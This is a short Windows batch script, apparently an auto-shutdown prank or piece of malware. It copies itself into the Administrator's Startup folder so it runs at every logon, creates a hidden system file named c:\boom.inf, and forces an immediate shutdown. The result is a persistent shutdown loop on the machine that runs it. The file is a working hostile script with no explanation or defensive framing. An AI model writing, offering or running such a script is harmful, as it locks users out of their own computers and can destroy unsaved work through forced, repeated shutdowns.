pause
@echo off
copy 自动关机脚本.bat "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
pause
pause
fsutil file createnew c:\boom.inf 230000
attrib +s +h c:\boom.inf
shutdown -s -f -t 0